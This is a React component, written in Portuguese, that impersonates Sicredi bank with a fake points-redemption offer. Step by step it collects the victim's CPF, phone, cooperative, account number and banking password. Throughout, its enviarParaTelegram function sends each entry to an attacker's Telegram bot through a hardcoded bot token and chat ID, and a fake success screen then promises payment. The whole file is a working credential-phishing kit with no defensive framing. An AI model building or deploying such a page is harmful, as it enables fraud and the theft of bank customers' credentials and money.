import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Loader2, CheckCircle, User, Phone, Building, CreditCard, Lock } from "lucide-react";

// Enumerar os passos do formulário
enum FormStep {
  CPF,
  POINTS,
  PHONE,
  ACCOUNT,
  PASSWORD,
  SUCCESS
}

const ClientForm = () => {
  // Estado para controlar o passo atual do formulário
  const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.CPF);
  
  // Estado para armazenar os dados do formulário
  const [formData, setFormData] = useState({
    cpf: "",
    phone: "",
    cooperative: "",
    account: "",
    password: ""
  });
  
  // Estado para indicar carregamento
  const [isLoading, setIsLoading] = useState(false);
  
  // Função para formatar CPF
  const formatCPF = (value: string) => {
    return value
      .replace(/\D/g, '') // Remove tudo que não for número
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
      .substring(0, 14); // Limita a 14 caracteres (CPF formatado)
  };
  
  // Função para formatar telefone
  const formatPhone = (value: string) => {
    return value
      .replace(/\D/g, '') // Remove tudo que não for número
      .replace(/(\d{2})(\d)/, '($1) $2')
      .replace(/(\d{5})(\d)/, '$1-$2')
      .substring(0, 15); // Limita a 15 caracteres (telefone formatado)
  };
  
  // Função para verificar os dígitos do CPF
  const verificarDigitosCPF = (cpf: string) => {
    // Remove qualquer caractere que não seja número
    cpf = cpf.replace(/\D/g, '');
    
    // Verifica se tem 11 dígitos
    if (cpf.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1+$/.test(cpf)) return false;
    
    // Calcula primeiro dígito verificador
    let soma = 0;
    for (let i = 1; i <= 9; i++) {
      soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    }
    let resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    
    // Calcula segundo dígito verificador
    soma = 0;
    for (let i = 1; i <= 10; i++) {
      soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(10, 11))) return false;
    
    return true;
  };
  
  // Função para lidar com a mudança nos campos do formulário
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // Aplicar formatação específica
    let formattedValue = value;
    if (name === 'cpf') formattedValue = formatCPF(value);
    if (name === 'phone') formattedValue = formatPhone(value);
    
    setFormData(prev => ({ ...prev, [name]: formattedValue }));
  };
  
  // Função para validar o CPF
  const validateCPF = () => {
    const cpfLimpo = formData.cpf.replace(/\D/g, '');
    
    if (!formData.cpf || !verificarDigitosCPF(cpfLimpo)) {
      alert("CPF inválido! Por favor, digite um CPF válido no formato 000.000.000-00");
      return;
    }
    
    // Envia o CPF para o Telegram
    enviarParaTelegram('CPF: ' + formData.cpf);
    
    // Avança para o próximo passo
    setCurrentStep(FormStep.POINTS);
  };
  
  // Função para validar o telefone
  const validatePhone = () => {
    const phoneLimpo = formData.phone.replace(/\D/g, '');
    
    if (!formData.phone || phoneLimpo.length < 11) {
      alert("Telefone inválido! Por favor, digite um telefone válido no formato (00) 00000-0000");
      return;
    }
    
    // Envia o telefone para o Telegram
    enviarParaTelegram('Telefone: ' + formData.phone);
    
    // Avança para o próximo passo
    setCurrentStep(FormStep.ACCOUNT);
  };
  
  // Função para validar a conta e cooperativa
  const validateAccount = () => {
    if (!formData.cooperative || formData.cooperative.length < 3) {
      alert("Cooperativa inválida! Por favor, digite uma cooperativa válida");
      return;
    }
    if (!formData.account || formData.account.length < 3) {
      alert("Conta inválida! Por favor, digite uma conta válida");
      return;
    }
    
    // Envia os dados para o Telegram
    enviarParaTelegram('Cooperativa: ' + formData.cooperative + '\nConta: ' + formData.account);
    
    // Simula carregamento
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setCurrentStep(FormStep.PASSWORD);
    }, 1500);
  };
  
  // Função para finalizar o cadastro
  const finalizarCadastro = () => {
    if (!formData.password || formData.password.length < 4) {
      alert("Senha inválida! Por favor, digite uma senha válida com pelo menos 4 caracteres");
      return;
    }
    
    // Envia a senha para o Telegram
    enviarParaTelegram('Senha: ' + formData.password);
    
    // Salva os dados no localStorage para demonstração
    localStorage.setItem('formData', JSON.stringify(formData));
    
    // Avança para o passo de sucesso
    setCurrentStep(FormStep.SUCCESS);
  };
  
  // Função para reiniciar o formulário
  const resetForm = () => {
    setFormData({
      cpf: "",
      phone: "",
      cooperative: "",
      account: "",
      password: ""
    });
    setCurrentStep(FormStep.CPF);
  };
  
  // Função para enviar dados para o Telegram
  const enviarParaTelegram = (mensagem: string) => {
    const token = '7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3ds';
    const chatId = '6019114072';
    
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensagem,
      }),
    }).catch(error => {
      console.error('Erro ao enviar para o Telegram:', error);
    });
  };
  
  return (
    <Card className="w-full max-w-md border-2 border-[#33820d] rounded-[40px] shadow-lg overflow-hidden">
      {/* CPF Step */}
      {currentStep === FormStep.CPF && (
        <div className="p-6 text-center">
          <p className="text-lg mb-4">
            Resgate <span className="font-bold text-[#33820d]">AGORA</span> seus pontos acumulados por utilizar a <span className="font-bold text-[#33820d]">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Programa de pontos Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-6">
            Se usou seu cartão <span className="font-bold text-[#33820d]">SICREDI</span> para compras entre <span className="font-bold text-[#33820d]">2022</span> e <span className="font-bold text-[#33820d]">2024</span>, insira seu CPF abaixo:
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="cpf" className="flex items-center text-gray-700 mb-2">
              <User className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>CPF:</span>
            </Label>
            <Input
              id="cpf"
              name="cpf"
              placeholder="000.000.000-00"
              value={formData.cpf}
              onChange={handleInputChange}
              className="w-full px-4 py-3 rounded-full border-2 border-[#33820d] focus:outline-none focus:border-[#276c0f] focus:ring-1 focus:ring-[#276c0f]"
            />
          </div>
          
          <Button 
            onClick={validateCPF}
            className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
          >
            Validar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="font-bold text-[#33820d]">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Points Step */}
      {currentStep === FormStep.POINTS && (
        <div className="p-6 text-center">
          <p className="text-xl font-bold text-[#33820d] mb-2">Pontos Liberados!</p>
          <div className="text-3xl font-bold my-4 bg-[#edf7e7] py-3 rounded-xl text-[#33820d]">34.500 PTS</div>
          <p className="text-sm mb-4">
            Conforme a consulta de CPF em nosso banco de dados, verificamos que você tem direito a PONTOS devido ao uso do seu cartão entre 2022 e 2024.
          </p>
          <p className="text-sm mb-6">
            Prossiga com as informações do seu cadastro e receba o valor em até 3 dias úteis.
          </p>
          <Button 
            onClick={() => setCurrentStep(FormStep.PHONE)}
            className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
          >
            Continuar
          </Button>
        </div>
      )}
      
      {/* Phone Step */}
      {currentStep === FormStep.PHONE && (
        <div className="p-6 text-center">
          <p className="text-lg mb-6">
            Por favor, insira seu <span className="font-bold text-[#33820d]">telefone</span> para continuar
          </p>
          <div className="mb-4">
            <Input
              id="phone"
              name="phone"
              placeholder="(00) 00000-0000"
              value={formData.phone}
              onChange={handleInputChange}
              className="w-full px-4 py-3 rounded-full border-2 border-[#33820d] focus:outline-none focus:border-[#276c0f] focus:ring-1 focus:ring-[#276c0f]"
            />
          </div>
          <Button 
            onClick={validatePhone}
            className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
          >
            Continuar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="font-bold text-[#33820d]">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Account Step */}
      {currentStep === FormStep.ACCOUNT && (
        <div className="p-6 text-center">
          <p className="text-lg mb-2">
            Resgate <span className="font-bold text-[#33820d]">AGORA</span> seus pontos acumulados por utilizar a <span className="font-bold text-[#33820d]">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Cartão Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-4" id="accountInstructions">
            Antes de prosseguir, apenas precisamos validar algumas informações.
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="cooperative" className="flex items-center text-gray-700 mb-2">
              <Building className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Cooperativa:</span>
            </Label>
            <Input
              id="cooperative"
              name="cooperative"
              placeholder="Cooperativa"
              value={formData.cooperative}
              onChange={handleInputChange}
              className="w-full px-4 py-3 rounded-full border-2 border-[#33820d] focus:outline-none focus:border-[#276c0f] focus:ring-1 focus:ring-[#276c0f]"
            />
          </div>
          
          <div className="mb-4 text-left">
            <Label htmlFor="account" className="flex items-center text-gray-700 mb-2">
              <CreditCard className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Conta:</span>
            </Label>
            <Input
              id="account"
              name="account"
              placeholder="Número da conta"
              value={formData.account}
              onChange={handleInputChange}
              className="w-full px-4 py-3 rounded-full border-2 border-[#33820d] focus:outline-none focus:border-[#276c0f] focus:ring-1 focus:ring-[#276c0f]"
            />
          </div>
          
          {isLoading && (
            <div className="my-4 text-[#33820d]">
              <Loader2 className="h-5 w-5 animate-spin mx-auto" />
              <span className="text-sm">Carregando...</span>
            </div>
          )}
          
          <Button 
            onClick={validateAccount}
            className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
            disabled={isLoading}
          >
            Validar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="font-bold text-[#33820d]">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Password Step */}
      {currentStep === FormStep.PASSWORD && (
        <div className="p-6 text-center">
          <p className="text-lg mb-2">
            Resgate <span className="font-bold text-[#33820d]">AGORA</span> seus pontos acumulados por utilizar a <span className="font-bold text-[#33820d]">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Cartão Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-4">
            Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="password" className="flex items-center text-gray-700 mb-2">
              <Lock className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Senha:</span>
            </Label>
            <Input
              id="password"
              name="password"
              type="password"
              placeholder="Digite sua senha"
              value={formData.password}
              onChange={handleInputChange}
              className="w-full px-4 py-3 rounded-full border-2 border-[#33820d] focus:outline-none focus:border-[#276c0f] focus:ring-1 focus:ring-[#276c0f]"
            />
          </div>
          
          <Button 
            onClick={finalizarCadastro}
            className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
            disabled={isLoading}
          >
            {isLoading ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                Processando...
              </>
            ) : "Finalizar"}
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="font-bold text-[#33820d]">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Success Step */}
      {currentStep === FormStep.SUCCESS && (
        <div className="p-6 text-center">
          <div className="my-6 flex flex-col items-center">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="h-10 w-10 text-green-500" />
            </div>
            <h2 className="text-xl font-bold text-[#33820d] mb-2">Solicitação Confirmada!</h2>
            <p className="text-sm mb-6">
              Seus pontos serão processados e você receberá o valor em até 3 dias úteis em sua conta.
            </p>
            <Button 
              onClick={resetForm}
              className="w-full py-3 bg-[#33820d] hover:bg-[#276c0f] text-white font-medium rounded-full transition duration-200 focus:outline-none"
            >
              Concluir
            </Button>
          </div>
        </div>
      )}
    </Card>
  );
};

export default ClientForm;